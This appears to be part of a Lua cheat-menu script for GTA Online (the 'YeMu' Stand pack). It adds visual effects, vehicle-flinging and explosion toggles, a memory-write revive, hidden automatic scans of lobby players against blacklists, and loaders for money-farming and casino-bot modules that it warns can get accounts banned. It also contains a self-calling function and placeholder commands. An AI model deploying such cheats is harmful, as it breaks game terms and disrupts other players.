    TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmcollect_paperleadinout@", "meditiate_idle", 3, 3, -1, 51, 0, false, false, false) --play anim 
    else
    menu.trigger_commands("luntaixiaoguo off")
    end
end)
-------------------------------------------------------------------------------------------------
p_eff_fun = menu.list(funfeatures, "娱乐粒子效果", {}, "")
        menu.toggle_loop(p_eff_fun, '开启', {}, '', function ()
            ptfx_fun()
        end)
        menu.list_select(p_eff_fun, '设置粒子效果', {}, '发送您选择的粒子效果', funptfxlist, 1, function (value)
            sel_ptfx_fun(value)
end)
menu.textslider(funfeatures, "极限飞跃", {}, "从飞机上一跃而下，然后打开飞行,两个字“刺激”！", {"低","中","高","极高"}, function(index)
    extreme_jump(index)
end)
menu.action(funfeatures, "小丑炸弹车", {}, "请提前开启无敌", function ()
    bomb_car()
end)
menu.toggle_loop(funfeatures, "防空作战队", {}, "", function()
    escort()
end)
menu.toggle_loop(self, "神之力", {"YL"}, "", function()local other = menu
	if state == 0 then
		notification(notif_format, HudColour.black, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())
		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)
			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end, function()
	state = 0
end)
menu.toggle_loop(self, "假死雷达（地图上不会出现你）", {"undeadotr"}, "", function()
    undead()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth_cantseeyouinmap)
end)
menu.toggle_loop(self, "一拳超人", {""}, "想不想在洛圣都当一拳超人呢~？", function()
    supermanpersonl()
end)
local bones <const> = {
        0x49D9,	-- left hand
        0xDEAD,	-- right hand
        0x3779,	-- left foot
        0xCC4D	-- right foot
    }
    local colour9 = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
    local timer <const> = newTimer()
    local trailsOpt <const> = menu.list(self,"尾翼选项"), {}, ""
    local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
    local effects = {}
    
    menu.toggle_loop(trailsOpt,"尾翼", {"trails"}, "", function ()
        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
            return
        end
        if timer.elapsed() >= 1000 then
            removeFxs(effects); effects = {}
            timer.reset()
        end
        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            local minimum, maximum = v3.new(), v3.new()
            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
            for _, offset in ipairs(offsets) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                    effect.name,
                    vehicle,
                    offset.x,
                    offset.y,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour9.r, colour9.g, colour9.b, 0)
                table.insert(effects, fx)
            end
        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then
            for _, boneId in ipairs(bones) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
                    effect.name,
                    players.user_ped(),
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour9.r, colour9.g, colour9.b, 0)
                table.insert(effects, fx)
            end
        end
    end, function ()
        removeFxs(effects); effects = {}
    end)
    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "", colour9, false, function(newColour)
         colour9 = newColour 
    end)
    menu.rainbow(trailColour)
local yuleself = menu.list(self, "娱乐选项", {}, "对于自己的娱乐选项")
menu.action(yuleself, "IKUN想和你玩个游戏", {}, "看看IKUN能否保护你？", function()
    if randomizer(array) == "1" then
        notification("很幸运，IKUN保住了你的游戏，听首歌吧。", colors.black)
        store_dir = filesystem.store_dir() .. '\\YMss\\'
            sound_selection_dir = store_dir .. '\\sound7.txt'
           if not filesystem.is_dir(store_dir) then
               util.toast("夜幕音频没有正确安装！.")
              util.stop_script()
             end
            fp = io.open(sound_selection_dir, 'r')
             local file_selection = fp:read('*a')
             fp:close()
                 local sound_location = store_dir .. '\\' .. file_selection
              if not filesystem.exists(sound_location) then
                    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
              else
               --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
              end
           util.keep_running()
    else
        notification("抱歉，IKUN没有保住你的游戏", colors.black)
    util.yield(3000)
     exit_game()
    end

end)
menu.action(yuleself, "学习资料", {}, "点击我获得学习资料！:)", function()
    util.toast("你个老sp，游戏已经满足不了你了吗？")
end)
menu.action(yuleself, "点击我去学习", {}, "快去学习！~~:)", function()
    util.toast("游戏马上关闭，快去写作业！")
    util.yield(3000)
     exit_game()

end)
menu.toggle_loop(self, "快速复活", {"fuhuo"}, "", function()
    local ped_ptr = entities.handle_to_pointer(players.user_ped())
    local gwobaw = memory.script_global(2672505 + 1684 + 756) -- Global_2672505.f_1684.f_756
    if entities.get_health(ped_ptr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
    end
end,
    function()
    local gwobaw = memory.script_global(2672505 + 1684 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) &~ (1 << 1)) 
end)
menu.toggle(self,"炫彩屏幕", {}, "", function(on)
    xuancaipm(on)
end)
menu.toggle_loop(self, "上帝之指", {"godfinger"}, "移动实体当你用手指指向他们时。按B键开始指向。", function()
    godfinger()
end)
menu.toggle_loop(self, "坤巴射炮V1", {""}, "要来一发炸裂的炮火吗？", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, -90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)
menu.toggle_loop(self, "坤巴射炮V2", {""}, "要来一发炸裂的炮火吗？", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trail_spawn"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, -90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)
local gendou = menu.list(self, "表演选项", {}, "对于自己的娱乐选项")
menu.action(gendou, '前空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, -360, -16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)
menu.action(gendou, '后空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, 360, 16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)
local firebreath = menu.list(gendou, "喷火", {""}, "")
    menu.toggle(firebreath, '嘴火', {'JSfireBreath'}, '', function(toggle)
        firebreathxxx(toggle)
    end)
    menu.slider(firebreath, '嘴火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        firebreathscale(value)
    end)
    menu.rainbow(menu.colour(firebreath, '嘴火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        firebreathcolour(colour)
    end))
menu.toggle(self, "游泳爱好者", {}, "", function(on)
    if on then
        menu.trigger_commands("swiminair on")
    else
        menu.trigger_commands("swiminair off")
    end
end)
menu.toggle_loop(self, "世界毁灭者", {""}, "", function()
	forcefielddd()
    menu.trigger_commands("YL on")
    wait(2000)
    menu.trigger_commands("YL off")
    menu.trigger_commands("yunluo on")
    wait(2000)
    menu.trigger_commands("yunluo off")
end)
menu.toggle(self, "变成兔子", {"spawnrabbit"}, "注意:掏出枪瞄准时会引发崩溃(XA)", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            notification("兔子模式启动") 
        else
            restore_model()
        end
end)
menu.toggle(self, "骑牛", {}, "",function(state)
    ride_cow(state)   
end)
TPF_Option = menu.list(self, "闪现选项", {}, "", function(); end)
tpf_units = 1
menu.action(TPF_Option, '点击闪现', {}, '', function(on_click)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)
menu.slider(TPF_Option, '闪现范围', {}, '', 1, 100, 1, 1, function(s)
    tpf_units = s
end)
menu.toggle_loop(self, "螺旋想升天", {}, "小亮，给他整个活~", function()
    breakdance()
    forward_roll()
end, function()
    end_forward_roll()
end, function()
    end_breakdance()
end)
require "lib.YeMulib.YMConfig.YMplan"
YMplannotified = {}
YMplan1 = menu.toggle(misc, "plan检测", {"plancheck"}, "", function(YM)
    YMplan = YM
    while YMplan do
        for PlayerID = 0, 32 do
            playerrid = players.get_name(PlayerID)
            for _, id in ipairs(YMplanid) do
                if playerrid == id.playerrid and not YMplannotified[id.playerrid] then
                    if PlayerID then
                        YMplan3(YM)
                        YMplannotified[id.playerrid] = true
                        --wait(1000)
                        YMplannotified[id.playerrid] = false
                        YMplan = false
                    end
                end
            end
        end
        wait(1000)
    end
end)
menu.trigger_commands("plancheck on")
menu.set_visible(YMplan1, false)
YMzanzhunotified2 = {}
YMzanzhu1 = menu.toggle(misc, "THANKS检测", {"zanzhucheck"}, "", function(YM2)
    YMzanzhu = YM2
    while YMzanzhu do
        for PlayerID = 0, 32 do
            playerid = players.get_name(PlayerID)
            for _, id in ipairs(YMth) do
                if playerid == id.playerid and not YMzanzhunotified2[id.playerid] then
                    if PlayerID then
                        YMplan4(YM2)
                        YMzanzhunotified2[id.playerid] = true
                        --wait(1000)
                        YMzanzhunotified2[id.playerid] = false
                        YMzanzhu = false
                    end
                end
            end
        end
        wait(1000)
    end
end)
menu.trigger_commands("zanzhucheck on")
menu.set_visible(YMzanzhu1, false)
YMBlack = {}
YMheiming1 = menu.toggle(misc, "YMblack_list检测", {"YMheiming"}, "", function(YM3)
    YMheiming3 = YM3
    while YMheiming3 do
        for PlayerID = 0, 32 do
            playerrrid = players.get_name(PlayerID)
            for _, id in ipairs(YMblacklist) do
                if playerrrid == id.playerrrid and not YMBlack[id.playerrrid] then
                    if PlayerID then
                        YMblack(YM3)
                        YMBlack[id.playerrrid] = true
                        --wait(1000)
                        YMBlack[id.playerrrid] = false
                        YMheiming3 = false
                    end
                end
            end
        end
        wait(1000)
    end
end)
menu.trigger_commands("YMheiming on")
menu.set_visible(YMheiming1, false)
menu.action(self, "获取位置坐标", {}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
    x = pos['x'] // 1
    y = pos['y'] // 1
    z = pos['z'] // 1
    chat.send_message("" .. players.get_name(players.user()) .. "的位置坐标为 x: "..x.." y: "..y.." z: "..z, true, true, false)
end)
menu.action(self, "洛圣都唯我独尊", {""}, "俯瞰洛圣都", function(on_click)
    local c1 = {}
    c1.x = 206
    c1.y = -80
    c1.z = 550
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c1.x, c1.y, c1.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1308766083)
        island_block = entities.create_object(1308766083, c1)
    end
end)
flyxuanxiang = menu.list(self, '飞翔选项', {}, '')
menu.action(flyxuanxiang, "一飞冲天", {}, "冲向云层", function()
	local myPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
	ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), myPos.x, myPos.y, myPos.z + 500.0, 1, 0, 0, 1)
end)
menu.action(flyxuanxiang, "给予降落伞", {}, "", function()
	WEAPON.GIVE_DELAYED_WEAPON_TO_PED(players.user_ped(), util.joaat("gadget_parachute"), 1, 0)
end)
menu.action(flyxuanxiang, "打开降落伞", {}, "滑翔的乐趣", function()
	PED.FORCE_PED_TO_OPEN_PARACHUTE(PLAYER.GET_PLAYER_PED(players.user()))
end)

 require "lib.YeMulib.YMhc"
baoguo = menu.list(zidongrenwu,"武器厢型车传送", {},"一键传送到对应位置！~")
zhaobaoguo = menu.action(baoguo, "加载厢型车地点传送选项", {""}, "寻找厢型车！", function()
        notification("正在加载武器厢型车地点传送,请稍等...",colors.blue)
        util.yield(1000)
        require "lib.YeMulib.YMbaoguo"
        menu.delete(zhaobaoguo)
    end)
casino_brush_money = menu.list(zidongrenwu, "全自动赌场（类似于刷钱）", {}, "")
 require "lib.YeMulib.YMSlotBot"
Musiness_Banager = menu.list(zidongrenwu, "自动产业 注:[风险]")
 require "lib.YeMulib.YMauto"
Transport = menu.list(zidongrenwu, "夜幕LUA传送点拓展", {}, "")
 require "lib.YeMulib.YMTp"
Transfer = menu.list(zidongrenwu, "夜幕拾取传送选项", {}, "")
 require "lib.YeMulib.YMTf"
cash = menu.list(zidongrenwu,"刷钱选项(1.1)(如果你的账号因此功能被封禁，夜幕将不负任何责任！)", {},"谨慎！谨慎！谨慎！")
menu.divider(cash, "警告：此选项中的所有功能都被视为有风险！")
menu.divider(cash, "您有可能在未知的天数内被禁止")
menu.divider(cash, "禁止是随机延迟的\n你已经被警告了！")
cashmoney = menu.action(cash, "加载刷钱选项", {""}, "", function()
        notification("正在加载刷钱选项,请稍等...",colors.black)
        util.yield(1500)
        require "lib.YeMulib.YMcash"
        menu.delete(cashmoney)
end)
function YMtest()
    async_http.init("www.eeegtav.asia", "",function(result)
        local tab = string.split(result,";")
        local version3 = tonumber(string.format(tab[1]))
        if version3 > Version then
            notification("~y~~bold~&#8721;"..tab[2], colors.blue)
            util. log(tab[2])
            util. stop_script()
        end
    end, function()
        local netnotify = net
        if type(netnotify) == "string" then
            if #netnotify == 26 then
                notification("~b~~bold~&#8721;"..netnotify, colors.black)
            else
               notification("网络连接失败，请重试！",colors.blue)
            end
        else
               notification("网络连接失败，请重试！",colors.blue)
        end
        util. stop_script()
    end)
    async_http.dispatch() 
  YMtest()
end
while true do
    Black_list()
    Black_self()
    util.yield()
end
--将最下方的数字1改为你想控制其默认开启或者关闭的功能的快捷指令。
--将最下方的数字2改为on或者off，on是默认开启此项功能，off是默认关闭此项功能
--举例： 下面是夜幕中负责显示时间的代码，我们要找的快捷指令就是大括号{}中间的英文。
--可以看到，下方的中文“显示时间”后方的大括号内英文是“timeos”，由此可知控制时间显示开启关闭的英文是“timeos”
--于是乎，我们可以将下方的1和2修改成  menu.trigger_commands("timeos off")，意思就是显示时间这一选项是默认关闭off的。
--
--show_time = menu.toggle(show_time_list, "显示时间", {"timeos"}, "", function(state)
--    xianshishijian(state)
--end)
--menu.set_value(show_time, config_active2)
--show_time_x = menu.slider(show_time_list, "x坐标", {"show_time-x"}, "配置[√]", -1000, 1000, config_active2_x, 10, function(x_)
--     showtime_x(x_)
--end)
--show_time_y = menu.slider(show_time_list, "y坐标", {"show_time-y"}, "配置[√]", -1000, 1000, config_active2_y, 10, function(y_)
--     showtime_y(y_)
--end)
--
--将Lua文件拖动到第5307行，从这里到5365行是夜幕的“加载显示选项”，可以通过以上的方法来修改默认开启和关闭的选项。
--适合在自己不会搞也懒得搞的时候使用此简单粗暴的方法修改加载显示选项。
--当然，不要被惯性思维迷惑，你可以用这个指令完成更加牛逼的效果，具体如何使用看你自己。
--进阶使用：也许？最下方的数字2不仅能改为on或者off？
--下方指令的默认意思是在脚本开启时在Stand自带的命令栏执行某些已设定快捷指令的按钮或者设定。
--我们完全可以将下方的2改为其他值，比如各种数字或者人名，用来在脚本开启的时候默认执行一些操作：
--比如：某些玩家显示，在脚本开启时自动开启，并通过以下指令自动将其设定到自己习惯的位置。
--又比如：某些服装，开启Stand是不是很烦？特别是还要自己手动去切换服装，更烦了。这个指令可以让你在开启脚本的时候切换到预设的服装。
--再比如：开启脚本时自动开启一些功能，比如翻译？不用自己动手设定。也可以开启一些最基本的防护，防止恶搞、防止套笼子之类的。也能开启一些针对其他玩家的检测，不用自己一个一个点过去。
--懒是世界第一动力，通过以上教程可以让自己开启脚本时少设定一些东西，何乐而不为？
--Stand的配置文件就是坨shit，本体的功能可以很完整的保存好，但Lua脚本内的东西很多时候不能正常保存，以上教程可以帮助你在脚本开启的时候直接设定完原本需要设定的东西。
--感谢夜幕和其他脚本作者提供的代码以供讲解。
--放心大胆去做你自己想做的事情，大不了重新安装脚本。
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")
menu.trigger_commands("1 2")